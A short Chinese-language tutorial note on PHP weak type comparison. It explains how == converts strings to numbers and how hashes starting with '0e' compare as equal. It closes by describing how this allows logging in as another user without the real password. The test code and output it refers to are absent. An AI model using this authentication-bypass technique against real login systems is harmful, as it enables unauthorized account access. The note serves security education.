PHP弱类型

0x01前提

php弱类型比较的原因在于两种符号：==和===

数值和字符串进行比较的时候，会将字符串转化成数值
测试1：

结果：

可见：
1.字符串被强制转化成数值，所以结果是0，什么时候都会和0相等。
2.”1abc”进行转化的时候结果和1相等，原因是如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0
3.”0e123”==”0e456”相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等。并且，PHP处理哈希字符串时，会利用！=和==来对哈希值进行比较，它把每一个以0e开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以0e开头的，那么PHP将认为他们相同，都是0。当hash以”0exxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx”之类的形式出现时，与”0”相等。可以利用这一漏洞，通过输入一个经过哈希后，以0E开头的字符串，即会被PHP解释为0，如果数据库中存在这种哈希值以0E开头的密码的话，他就可以以这个用户的身份登录进去，尽管并没有真正的密码。
